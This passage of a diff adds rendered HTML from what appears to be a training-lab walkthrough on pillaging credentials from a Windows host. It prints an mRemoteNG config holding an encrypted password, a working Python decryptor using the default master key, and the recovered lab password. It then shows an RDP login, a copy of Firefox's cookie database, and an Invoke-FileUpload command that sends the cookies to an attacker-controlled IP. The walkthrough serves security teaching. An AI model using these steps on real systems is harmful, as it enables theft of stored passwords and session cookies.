+</span><span id="__span-166-4"><a id="__codelineno-166-4" name="__codelineno-166-4"></a><span class="nt">&lt;Node</span><span class="w"> </span><span class="na">Name=</span><span class="s">&quot;Grace_Local_Acct&quot;</span><span class="w"> </span><span class="na">InheritRDGatewayDomain=</span><span class="s">&quot;false&quot;</span><span class="w"> </span><span class="na">InheritRDGatewayPassword=</span><span class="s">&quot;false&quot;</span><span class="w"> </span><span class="na">InheritRDGatewayUsername=</span><span class="s">&quot;false&quot;</span><span class="w"> </span><span class="na">InheritRDGatewayUseConnectionCredentials=</span><span class="s">&quot;false&quot;</span><span class="w"> </span><span class="na">InheritRDGatewayHostname=</span><span class="s">&quot;false&quot;</span><span class="w"> </span><span class="na">InheritRDGatewayUsageMethod=</span><span class="s">&quot;false&quot;</span><span class="w"> </span><span class="na">InheritVNCViewOnly=</span><span class="s">&quot;false&quot;</span><span class="w"> </span><span class="na">InheritVNCSmartSizeMode=</span><span class="s">&quot;false&quot;</span><span class="w"> </span><span class="na">InheritVNCColors=</span><span class="s">&quot;false&quot;</span><span class="w"> </span><span class="na">InheritVNCProxyPassword=</span><span class="s">&quot;false&quot;</span><span class="w"> </span><span class="na">InheritVNCProxyUsername=</span><span class="s">&quot;false&quot;</span><span class="w"> </span><span class="na">InheritVNCProxyPort=</span><span class="s">&quot;false&quot;</span><span class="w"> </span><span class="na">InheritVNCProxyIP=</span><span class="s">&quot;false&quot;</span><span class="w"> </span><span class="na">InheritVNCProxyType=</span><span class="s">&quot;false&quot;</span><span class="w"> </span><span class="na">InheritVNCAuthMode=</span><span class="s">&quot;false&quot;</span><span class="w"> </span><span class="na">InheritVNCEncoding=</span><span class="s">&quot;false&quot;</span><span class="w"> </span><span class="na">InheritVNCCompression=</span><span class="s">&quot;false&quot;</span><span class="w"> </span><span class="na">InheritExtApp=</span><span class="s">&quot;false&quot;</span><span class="w"> </span><span class="na">InheritUserField=</span><span class="s">&quot;false&quot;</span><span class="w"> </span><span class="na">InheritMacAddress=</span><span class="s">&quot;false&quot;</span><span class="w"> </span><span class="na">InheritPostExtApp=</span><span class="s">&quot;false&quot;</span><span class="w"> </span><span class="na">InheritPreExtApp=</span><span class="s">&quot;false&quot;</span><span class="w"> </span><span class="na">InheritLoadBalanceInfo=</span><span class="s">&quot;false&quot;</span><span class="w"> </span><span class="na">InheritRDPAlertIdleTimeout=</span><span class="s">&quot;false&quot;</span><span class="w"> </span><span class="na">InheritRDPMinutesToIdleTimeout=</span><span class="s">&quot;false&quot;</span><span class="w"> </span><span class="na">InheritRDPAuthenticationLevel=</span><span class="s">&quot;false&quot;</span><span class="w"> </span><span class="na">InheritICAEncryptionStrength=</span><span class="s">&quot;false&quot;</span><span class="w"> </span><span class="na">InheritUsername=</span><span class="s">&quot;false&quot;</span><span class="w"> </span><span class="na">InheritRenderingEngine=</span><span class="s">&quot;false&quot;</span><span class="w"> </span><span class="na">InheritUseCredSsp=</span><span class="s">&quot;false&quot;</span><span class="w"> </span><span class="na">InheritUseConsoleSession=</span><span class="s">&quot;false&quot;</span><span class="w"> </span><span class="na">InheritAutomaticResize=</span><span class="s">&quot;false&quot;</span><span class="w"> </span><span class="na">InheritResolution=</span><span class="s">&quot;false&quot;</span><span class="w"> </span><span class="na">InheritSoundQuality=</span><span class="s">&quot;false&quot;</span><span class="w"> </span><span class="na">InheritRedirectSound=</span><span class="s">&quot;false&quot;</span><span class="w"> </span><span class="na">InheritRedirectSmartCards=</span><span class="s">&quot;false&quot;</span><span class="w"> </span><span class="na">InheritRedirectPrinters=</span><span class="s">&quot;false&quot;</span><span class="w"> </span><span class="na">InheritRedirectPorts=</span><span class="s">&quot;false&quot;</span><span class="w"> </span><span class="na">InheritRedirectKeys=</span><span class="s">&quot;false&quot;</span><span class="w"> </span><span class="na">InheritRedirectDiskDrives=</span><span class="s">&quot;false&quot;</span><span class="w"> </span><span class="na">InheritPuttySession=</span><span class="s">&quot;false&quot;</span><span class="w"> </span><span class="na">InheritProtocol=</span><span class="s">&quot;false&quot;</span><span class="w"> </span><span class="na">InheritPort=</span><span class="s">&quot;false&quot;</span><span class="w"> </span><span class="na">InheritPassword=</span><span class="s">&quot;false&quot;</span><span class="w"> </span><span class="na">InheritPanel=</span><span class="s">&quot;false&quot;</span><span class="w"> </span><span class="na">InheritIcon=</span><span class="s">&quot;false&quot;</span><span class="w"> </span><span class="na">InheritDomain=</span><span class="s">&quot;false&quot;</span><span class="w"> </span><span class="na">InheritEnableDesktopComposition=</span><span class="s">&quot;false&quot;</span><span class="w"> </span><span class="na">InheritEnableFontSmoothing=</span><span class="s">&quot;false&quot;</span><span class="w"> </span><span class="na">InheritDisplayWallpaper=</span><span class="s">&quot;false&quot;</span><span class="w"> </span><span class="na">InheritDisplayThemes=</span><span class="s">&quot;false&quot;</span><span class="w"> </span><span class="na">InheritDescription=</span><span class="s">&quot;false&quot;</span><span class="w"> </span><span class="na">InheritColors=</span><span class="s">&quot;false&quot;</span><span class="w"> </span><span class="na">InheritCacheBitmaps=</span><span class="s">&quot;false&quot;</span><span class="w"> </span><span class="na">RDGatewayDomain=</span><span class="s">&quot;&quot;</span><span class="w"> </span><span class="na">RDGatewayPassword=</span><span class="s">&quot;&quot;</span><span class="w"> </span><span class="na">RDGatewayUsername=</span><span class="s">&quot;&quot;</span><span class="w"> </span><span class="na">RDGatewayUseConnectionCredentials=</span><span class="s">&quot;Yes&quot;</span><span class="w"> </span><span class="na">RDGatewayHostname=</span><span class="s">&quot;&quot;</span><span class="w"> </span><span class="na">RDGatewayUsageMethod=</span><span class="s">&quot;Never&quot;</span><span class="w"> </span><span class="na">VNCViewOnly=</span><span class="s">&quot;false&quot;</span><span class="w"> </span><span class="na">VNCSmartSizeMode=</span><span class="s">&quot;SmartSAspect&quot;</span><span class="w"> </span><span class="na">VNCColors=</span><span class="s">&quot;ColNormal&quot;</span><span class="w"> </span><span class="na">VNCProxyPassword=</span><span class="s">&quot;&quot;</span><span class="w"> </span><span class="na">VNCProxyUsername=</span><span class="s">&quot;&quot;</span><span class="w"> </span><span class="na">VNCProxyPort=</span><span class="s">&quot;0&quot;</span><span class="w"> </span><span class="na">VNCProxyIP=</span><span class="s">&quot;&quot;</span><span class="w"> </span><span class="na">VNCProxyType=</span><span class="s">&quot;ProxyNone&quot;</span><span class="w"> </span><span class="na">VNCAuthMode=</span><span class="s">&quot;AuthVNC&quot;</span><span class="w"> </span><span class="na">VNCEncoding=</span><span class="s">&quot;EncHextile&quot;</span><span class="w"> </span><span class="na">VNCCompression=</span><span class="s">&quot;CompNone&quot;</span><span class="w"> </span><span class="na">ExtApp=</span><span class="s">&quot;&quot;</span><span class="w"> </span><span class="na">UserField=</span><span class="s">&quot;&quot;</span><span class="w"> </span><span class="na">MacAddress=</span><span class="s">&quot;&quot;</span><span class="w"> </span><span class="na">PostExtApp=</span><span class="s">&quot;&quot;</span><span class="w"> </span><span class="na">PreExtApp=</span><span class="s">&quot;&quot;</span><span class="w"> </span><span class="na">Connected=</span><span class="s">&quot;false&quot;</span><span class="w"> </span><span class="na">RedirectKeys=</span><span class="s">&quot;false&quot;</span><span class="w"> </span><span class="na">SoundQuality=</span><span class="s">&quot;Dynamic&quot;</span><span class="w"> </span><span class="na">RedirectSound=</span><span class="s">&quot;DoNotPlay&quot;</span><span class="w"> </span><span class="na">RedirectSmartCards=</span><span class="s">&quot;false&quot;</span><span class="w"> </span><span class="na">RedirectPrinters=</span><span class="s">&quot;false&quot;</span><span class="w"> </span><span class="na">RedirectPorts=</span><span class="s">&quot;false&quot;</span><span class="w"> </span><span class="na">RedirectDiskDrives=</span><span class="s">&quot;false&quot;</span><span class="w"> </span><span class="na">CacheBitmaps=</span><span class="s">&quot;false&quot;</span><span class="w"> </span><span class="na">EnableDesktopComposition=</span><span class="s">&quot;false&quot;</span><span class="w"> </span><span class="na">EnableFontSmoothing=</span><span class="s">&quot;false&quot;</span><span class="w"> </span><span class="na">DisplayThemes=</span><span class="s">&quot;false&quot;</span><span class="w"> </span><span class="na">DisplayWallpaper=</span><span class="s">&quot;false&quot;</span><span class="w"> </span><span class="na">AutomaticResize=</span><span class="s">&quot;true&quot;</span><span class="w"> </span><span class="na">Resolution=</span><span class="s">&quot;FitToWindow&quot;</span><span class="w"> </span><span class="na">Colors=</span><span class="s">&quot;Colors16Bit&quot;</span><span class="w"> </span><span class="na">LoadBalanceInfo=</span><span class="s">&quot;&quot;</span><span class="w"> </span><span class="na">RDPAlertIdleTimeout=</span><span class="s">&quot;false&quot;</span><span class="w"> </span><span class="na">RDPMinutesToIdleTimeout=</span><span class="s">&quot;0&quot;</span><span class="w"> </span><span class="na">RDPAuthenticationLevel=</span><span class="s">&quot;NoAuth&quot;</span><span class="w"> </span><span class="na">ICAEncryptionStrength=</span><span class="s">&quot;EncrBasic&quot;</span><span class="w"> </span><span class="na">RenderingEngine=</span><span class="s">&quot;IE&quot;</span><span class="w"> </span><span class="na">UseCredSsp=</span><span class="s">&quot;true&quot;</span><span class="w"> </span><span class="na">ConnectToConsole=</span><span class="s">&quot;false&quot;</span><span class="w"> </span><span class="na">Port=</span><span class="s">&quot;3389&quot;</span><span class="w"> </span><span class="na">PuttySession=</span><span class="s">&quot;Default Settings&quot;</span><span class="w"> </span><span class="na">Protocol=</span><span class="s">&quot;RDP&quot;</span><span class="w"> </span><span class="na">Hostname=</span><span class="s">&quot;localhost&quot;</span><span class="w"> </span><span class="na">Password=</span><span class="s">&quot;s1LN9UqWy2QFv2aKvGF42YRfFvp0bytu04yyCuVQiI12MQvkYT3XcOxWaLTz0aSNjRjr3Rilf6Xb4XQ=&quot;</span><span class="w"> </span><span class="na">Domain=</span><span class="s">&quot;PILLAGING-WIN01&quot;</span><span class="w"> </span><span class="na">Username=</span><span class="s">&quot;grace&quot;</span><span class="w"> </span><span class="na">Id=</span><span class="s">&quot;88291c0c-b6b0-4f2d-b180-81d3b50485a4&quot;</span><span class="w"> </span><span class="na">Panel=</span><span class="s">&quot;General&quot;</span><span class="w"> </span><span class="na">Icon=</span><span class="s">&quot;mRemoteNG&quot;</span><span class="w"> </span><span class="na">Descr=</span><span class="s">&quot;Grace Account&quot;</span><span class="w"> </span><span class="na">Type=</span><span class="s">&quot;Connection&quot;</span><span class="nt">/&gt;&lt;/mrng:Connections&gt;</span>
+</span></code></pre></div></td></tr></table></div>
+<p>We can use this string to attempt to crack the master password. We will find some elements named <code>Node</code> within the root element. Those nodes contain details about the remote system, such as username, domain, hostname, protocol, and password. All fields are plaintext except the password, which is encrypted with the master password.</p>
+<p>We will use the script <a href="https://github.com/haseebT/mRemoteNG-Decrypt">mRemoteNG-Decrypt</a> to decrypt the password:</p>
+<div class="language-python highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-167-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-167-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-167-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-167-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-167-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-167-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-167-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-167-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-167-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-167-10">10</a></span>
+<span class="normal"><a href="#__codelineno-167-11">11</a></span>
+<span class="normal"><a href="#__codelineno-167-12">12</a></span>
+<span class="normal"><a href="#__codelineno-167-13">13</a></span>
+<span class="normal"><a href="#__codelineno-167-14">14</a></span>
+<span class="normal"><a href="#__codelineno-167-15">15</a></span>
+<span class="normal"><a href="#__codelineno-167-16">16</a></span>
+<span class="normal"><a href="#__codelineno-167-17">17</a></span>
+<span class="normal"><a href="#__codelineno-167-18">18</a></span>
+<span class="normal"><a href="#__codelineno-167-19">19</a></span>
+<span class="normal"><a href="#__codelineno-167-20">20</a></span>
+<span class="normal"><a href="#__codelineno-167-21">21</a></span>
+<span class="normal"><a href="#__codelineno-167-22">22</a></span>
+<span class="normal"><a href="#__codelineno-167-23">23</a></span>
+<span class="normal"><a href="#__codelineno-167-24">24</a></span>
+<span class="normal"><a href="#__codelineno-167-25">25</a></span>
+<span class="normal"><a href="#__codelineno-167-26">26</a></span>
+<span class="normal"><a href="#__codelineno-167-27">27</a></span>
+<span class="normal"><a href="#__codelineno-167-28">28</a></span>
+<span class="normal"><a href="#__codelineno-167-29">29</a></span>
+<span class="normal"><a href="#__codelineno-167-30">30</a></span>
+<span class="normal"><a href="#__codelineno-167-31">31</a></span>
+<span class="normal"><a href="#__codelineno-167-32">32</a></span>
+<span class="normal"><a href="#__codelineno-167-33">33</a></span>
+<span class="normal"><a href="#__codelineno-167-34">34</a></span>
+<span class="normal"><a href="#__codelineno-167-35">35</a></span>
+<span class="normal"><a href="#__codelineno-167-36">36</a></span>
+<span class="normal"><a href="#__codelineno-167-37">37</a></span>
+<span class="normal"><a href="#__codelineno-167-38">38</a></span>
+<span class="normal"><a href="#__codelineno-167-39">39</a></span>
+<span class="normal"><a href="#__codelineno-167-40">40</a></span>
+<span class="normal"><a href="#__codelineno-167-41">41</a></span>
+<span class="normal"><a href="#__codelineno-167-42">42</a></span>
+<span class="normal"><a href="#__codelineno-167-43">43</a></span>
+<span class="normal"><a href="#__codelineno-167-44">44</a></span>
+<span class="normal"><a href="#__codelineno-167-45">45</a></span>
+<span class="normal"><a href="#__codelineno-167-46">46</a></span>
+<span class="normal"><a href="#__codelineno-167-47">47</a></span>
+<span class="normal"><a href="#__codelineno-167-48">48</a></span>
+<span class="normal"><a href="#__codelineno-167-49">49</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-167-1"><a id="__codelineno-167-1" name="__codelineno-167-1"></a><span class="ch">#!/usr/bin/env python3</span>
+</span><span id="__span-167-2"><a id="__codelineno-167-2" name="__codelineno-167-2"></a>
+</span><span id="__span-167-3"><a id="__codelineno-167-3" name="__codelineno-167-3"></a><span class="kn">import</span><span class="w"> </span><span class="nn">hashlib</span>
+</span><span id="__span-167-4"><a id="__codelineno-167-4" name="__codelineno-167-4"></a><span class="kn">import</span><span class="w"> </span><span class="nn">base64</span>
+</span><span id="__span-167-5"><a id="__codelineno-167-5" name="__codelineno-167-5"></a><span class="kn">from</span><span class="w"> </span><span class="nn">Cryptodome.Cipher</span><span class="w"> </span><span class="kn">import</span> <span class="n">AES</span>
+</span><span id="__span-167-6"><a id="__codelineno-167-6" name="__codelineno-167-6"></a><span class="kn">import</span><span class="w"> </span><span class="nn">argparse</span>
+</span><span id="__span-167-7"><a id="__codelineno-167-7" name="__codelineno-167-7"></a><span class="kn">import</span><span class="w"> </span><span class="nn">sys</span>
+</span><span id="__span-167-8"><a id="__codelineno-167-8" name="__codelineno-167-8"></a>
+</span><span id="__span-167-9"><a id="__codelineno-167-9" name="__codelineno-167-9"></a><span class="k">def</span><span class="w"> </span><span class="nf">main</span><span class="p">():</span>
+</span><span id="__span-167-10"><a id="__codelineno-167-10" name="__codelineno-167-10"></a>  <span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="o">.</span><span class="n">ArgumentParser</span><span class="p">(</span><span class="n">description</span><span class="o">=</span><span class="s2">&quot;Decrypt mRemoteNG passwords.&quot;</span><span class="p">)</span>
+</span><span id="__span-167-11"><a id="__codelineno-167-11" name="__codelineno-167-11"></a>  <span class="n">group</span> <span class="o">=</span> <span class="n">parser</span><span class="o">.</span><span class="n">add_mutually_exclusive_group</span><span class="p">()</span>
+</span><span id="__span-167-12"><a id="__codelineno-167-12" name="__codelineno-167-12"></a>  <span class="n">group</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s2">&quot;-f&quot;</span><span class="p">,</span> <span class="s2">&quot;--file&quot;</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s2">&quot;name of file containing mRemoteNG password&quot;</span><span class="p">)</span>
+</span><span id="__span-167-13"><a id="__codelineno-167-13" name="__codelineno-167-13"></a>  <span class="n">group</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s2">&quot;-s&quot;</span><span class="p">,</span> <span class="s2">&quot;--string&quot;</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s2">&quot;base64 string of mRemoteNG password&quot;</span><span class="p">)</span>
+</span><span id="__span-167-14"><a id="__codelineno-167-14" name="__codelineno-167-14"></a>  <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s2">&quot;-p&quot;</span><span class="p">,</span> <span class="s2">&quot;--password&quot;</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s2">&quot;Custom password&quot;</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="s2">&quot;mR3m&quot;</span><span class="p">)</span>
+</span><span id="__span-167-15"><a id="__codelineno-167-15" name="__codelineno-167-15"></a>
+</span><span id="__span-167-16"><a id="__codelineno-167-16" name="__codelineno-167-16"></a>  <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">:</span>
+</span><span id="__span-167-17"><a id="__codelineno-167-17" name="__codelineno-167-17"></a>    <span class="n">parser</span><span class="o">.</span><span class="n">print_help</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">stderr</span><span class="p">)</span>
+</span><span id="__span-167-18"><a id="__codelineno-167-18" name="__codelineno-167-18"></a>    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span><span id="__span-167-19"><a id="__codelineno-167-19" name="__codelineno-167-19"></a>
+</span><span id="__span-167-20"><a id="__codelineno-167-20" name="__codelineno-167-20"></a>  <span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="o">.</span><span class="n">parse_args</span><span class="p">()</span>
+</span><span id="__span-167-21"><a id="__codelineno-167-21" name="__codelineno-167-21"></a>  <span class="n">encrypted_data</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
+</span><span id="__span-167-22"><a id="__codelineno-167-22" name="__codelineno-167-22"></a>  <span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">file</span> <span class="o">!=</span> <span class="kc">None</span><span class="p">:</span>
+</span><span id="__span-167-23"><a id="__codelineno-167-23" name="__codelineno-167-23"></a>    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">file</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+</span><span id="__span-167-24"><a id="__codelineno-167-24" name="__codelineno-167-24"></a>      <span class="n">encrypted_data</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+</span><span id="__span-167-25"><a id="__codelineno-167-25" name="__codelineno-167-25"></a>      <span class="n">encrypted_data</span> <span class="o">=</span> <span class="n">encrypted_data</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
+</span><span id="__span-167-26"><a id="__codelineno-167-26" name="__codelineno-167-26"></a>      <span class="n">encrypted_data</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">encrypted_data</span><span class="p">)</span>
+</span><span id="__span-167-27"><a id="__codelineno-167-27" name="__codelineno-167-27"></a>
+</span><span id="__span-167-28"><a id="__codelineno-167-28" name="__codelineno-167-28"></a>  <span class="k">elif</span> <span class="n">args</span><span class="o">.</span><span class="n">string</span> <span class="o">!=</span> <span class="kc">None</span><span class="p">:</span>
+</span><span id="__span-167-29"><a id="__codelineno-167-29" name="__codelineno-167-29"></a>    <span class="n">encrypted_data</span> <span class="o">=</span> <span class="n">args</span><span class="o">.</span><span class="n">string</span>
+</span><span id="__span-167-30"><a id="__codelineno-167-30" name="__codelineno-167-30"></a>    <span class="n">encrypted_data</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">encrypted_data</span><span class="p">)</span>
+</span><span id="__span-167-31"><a id="__codelineno-167-31" name="__codelineno-167-31"></a>
+</span><span id="__span-167-32"><a id="__codelineno-167-32" name="__codelineno-167-32"></a>  <span class="k">else</span><span class="p">:</span>
+</span><span id="__span-167-33"><a id="__codelineno-167-33" name="__codelineno-167-33"></a>    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Please use either the file (-f, --file) or string (-s, --string) flag&quot;</span><span class="p">)</span>
+</span><span id="__span-167-34"><a id="__codelineno-167-34" name="__codelineno-167-34"></a>    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span><span id="__span-167-35"><a id="__codelineno-167-35" name="__codelineno-167-35"></a>
+</span><span id="__span-167-36"><a id="__codelineno-167-36" name="__codelineno-167-36"></a>  <span class="n">salt</span> <span class="o">=</span> <span class="n">encrypted_data</span><span class="p">[:</span><span class="mi">16</span><span class="p">]</span>
+</span><span id="__span-167-37"><a id="__codelineno-167-37" name="__codelineno-167-37"></a>  <span class="n">associated_data</span> <span class="o">=</span> <span class="n">encrypted_data</span><span class="p">[:</span><span class="mi">16</span><span class="p">]</span>
+</span><span id="__span-167-38"><a id="__codelineno-167-38" name="__codelineno-167-38"></a>  <span class="n">nonce</span> <span class="o">=</span> <span class="n">encrypted_data</span><span class="p">[</span><span class="mi">16</span><span class="p">:</span><span class="mi">32</span><span class="p">]</span>
+</span><span id="__span-167-39"><a id="__codelineno-167-39" name="__codelineno-167-39"></a>  <span class="n">ciphertext</span> <span class="o">=</span> <span class="n">encrypted_data</span><span class="p">[</span><span class="mi">32</span><span class="p">:</span><span class="o">-</span><span class="mi">16</span><span class="p">]</span>
+</span><span id="__span-167-40"><a id="__codelineno-167-40" name="__codelineno-167-40"></a>  <span class="n">tag</span> <span class="o">=</span> <span class="n">encrypted_data</span><span class="p">[</span><span class="o">-</span><span class="mi">16</span><span class="p">:]</span>
+</span><span id="__span-167-41"><a id="__codelineno-167-41" name="__codelineno-167-41"></a>  <span class="n">key</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">pbkdf2_hmac</span><span class="p">(</span><span class="s2">&quot;sha1&quot;</span><span class="p">,</span> <span class="n">args</span><span class="o">.</span><span class="n">password</span><span class="o">.</span><span class="n">encode</span><span class="p">(),</span> <span class="n">salt</span><span class="p">,</span> <span class="mi">1000</span><span class="p">,</span> <span class="n">dklen</span><span class="o">=</span><span class="mi">32</span><span class="p">)</span>
+</span><span id="__span-167-42"><a id="__codelineno-167-42" name="__codelineno-167-42"></a>
+</span><span id="__span-167-43"><a id="__codelineno-167-43" name="__codelineno-167-43"></a>  <span class="n">cipher</span> <span class="o">=</span> <span class="n">AES</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">AES</span><span class="o">.</span><span class="n">MODE_GCM</span><span class="p">,</span> <span class="n">nonce</span><span class="o">=</span><span class="n">nonce</span><span class="p">)</span>
+</span><span id="__span-167-44"><a id="__codelineno-167-44" name="__codelineno-167-44"></a>  <span class="n">cipher</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="n">associated_data</span><span class="p">)</span>
+</span><span id="__span-167-45"><a id="__codelineno-167-45" name="__codelineno-167-45"></a>  <span class="n">plaintext</span> <span class="o">=</span> <span class="n">cipher</span><span class="o">.</span><span class="n">decrypt_and_verify</span><span class="p">(</span><span class="n">ciphertext</span><span class="p">,</span> <span class="n">tag</span><span class="p">)</span>
+</span><span id="__span-167-46"><a id="__codelineno-167-46" name="__codelineno-167-46"></a>  <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Password: </span><span class="si">{}</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">plaintext</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s2">&quot;utf-8&quot;</span><span class="p">)))</span>
+</span><span id="__span-167-47"><a id="__codelineno-167-47" name="__codelineno-167-47"></a>
+</span><span id="__span-167-48"><a id="__codelineno-167-48" name="__codelineno-167-48"></a><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&quot;__main__&quot;</span><span class="p">:</span>
+</span><span id="__span-167-49"><a id="__codelineno-167-49" name="__codelineno-167-49"></a>  <span class="n">main</span><span class="p">()</span>
+</span></code></pre></div></td></tr></table></div>
+<p>We will clone it:</p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-168-1">1</a></span>
+<span class="normal"><a href="#__codelineno-168-2">2</a></span>
+<span class="normal"><a href="#__codelineno-168-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-168-1"><a id="__codelineno-168-1" name="__codelineno-168-1"></a>https://github.com/haseebT/mremoteng-decrypt-1.git
+</span><span id="__span-168-2"><a id="__codelineno-168-2" name="__codelineno-168-2"></a>
+</span><span id="__span-168-3"><a id="__codelineno-168-3" name="__codelineno-168-3"></a>cd mremoteng-decrypt
+</span></code></pre></div></td></tr></table></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-169-1">1</a></span>
+<span class="normal"><a href="#__codelineno-169-2">2</a></span>
+<span class="normal"><a href="#__codelineno-169-3">3</a></span>
+<span class="normal"><a href="#__codelineno-169-4">4</a></span>
+<span class="normal"><a href="#__codelineno-169-5">5</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-169-1"><a id="__codelineno-169-1" name="__codelineno-169-1"></a><span class="c1"># Access our environment:</span>
+</span><span id="__span-169-2"><a id="__codelineno-169-2" name="__codelineno-169-2"></a>activate<span class="w"> </span>tooling
+</span><span id="__span-169-3"><a id="__codelineno-169-3" name="__codelineno-169-3"></a>
+</span><span id="__span-169-4"><a id="__codelineno-169-4" name="__codelineno-169-4"></a><span class="c1"># Save the credentials to a file </span>
+</span><span id="__span-169-5"><a id="__codelineno-169-5" name="__codelineno-169-5"></a><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;s1LN9UqWy2QFv2aKvGF42YRfFvp0bytu04yyCuVQiI12MQvkYT3XcOxWaLTz0aSNjRjr3Rilf6Xb4XQ=&quot;</span><span class="w"> </span>&gt;<span class="w"> </span>file.txt
+</span></code></pre></div></td></tr></table></div>
+<p>And run the script:</p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-170-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-170-1"><a id="__codelineno-170-1" name="__codelineno-170-1"></a>python3 mremoteng_decrypt.py -f file.txt
+</span></code></pre></div></td></tr></table></div>
+<p>Output: 
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-171-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-171-1"><a id="__codelineno-171-1" name="__codelineno-171-1"></a>Password: Princess01!
+</span></code></pre></div></td></tr></table></div></p>
+<p><strong>Results</strong>: Princess01!</p>
+<p><strong>Log in as Grace and find the cookies for the slacktestapp.com website. Use the cookie to log in into slacktestapp.com from a browser within the RDP session and submit the flag.</strong></p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-172-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-172-1"><a id="__codelineno-172-1" name="__codelineno-172-1"></a>xfreerdp /v:10.129.138.81 /u:Grace /p:Princess01! /cert:ignore
+</span></code></pre></div></td></tr></table></div>
+<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-173-1">1</a></span>
+<span class="normal"><a href="#__codelineno-173-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-173-1"><a id="__codelineno-173-1" name="__codelineno-173-1"></a><span class="c"># Copy Firefox Cookies Database</span>
+</span><span id="__span-173-2"><a id="__codelineno-173-2" name="__codelineno-173-2"></a><span class="nb">copy </span><span class="nv">$env:APPDATA</span><span class="p">\</span><span class="n">Mozilla</span><span class="p">\</span><span class="n">Firefox</span><span class="p">\</span><span class="n">Profiles</span><span class="p">\*.</span><span class="k">default</span><span class="n">-release</span><span class="p">\</span><span class="n">cookies</span><span class="p">.</span><span class="n">sqlite</span> <span class="p">.</span>
+</span></code></pre></div></td></tr></table></div>
+<p>Now we use PSUpload.ps1 to download the file to our attacking machine. We set up the uploader server in our kali:</p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-174-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-174-1"><a id="__codelineno-174-1" name="__codelineno-174-1"></a>python -m uploadserver
+</span></code></pre></div></td></tr></table></div>
+<p>And from the host target machine:</p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-175-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-175-1"><a id="__codelineno-175-1" name="__codelineno-175-1"></a>Invoke-FileUpload -Uri http://10.10.15.105:8000/upload -File c:\Users\Grace\Desktop\cookies.sqlite
+</span></code></pre></div></td></tr></table></div>
